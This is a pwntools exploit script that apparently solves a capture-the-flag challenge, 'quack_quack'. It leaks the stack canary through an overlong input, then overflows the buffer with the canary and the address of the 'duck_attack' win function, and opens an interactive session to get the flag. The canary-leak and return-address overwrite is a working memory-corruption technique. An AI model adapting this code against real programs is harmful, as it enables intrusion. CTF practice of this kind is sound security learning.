from pwn import *


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)





# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *duckling
c
canary 
c
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './quack_quack'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
# offset = find_ip(cyclic(200))

# Start program
io = start()



payload = flat(b'A'*89,b'Quack Quack ') 
win = elf.symbols['duck_attack']

# Send the payload
io.sendlineafter(b'>', payload)
response = io.recvline()
canary = response.split(b"Quack Quack ")[1][:7]
canary = u64(b'\x00' + canary)

# print(canary)
log.info(f"canary :{hex(canary)}")

payload = flat(
    b'A'*88,
    p64(canary),
    p64(0),
    p64(win)
)

io.sendafter(b'>',payload)
# Get flag
io.interactive()
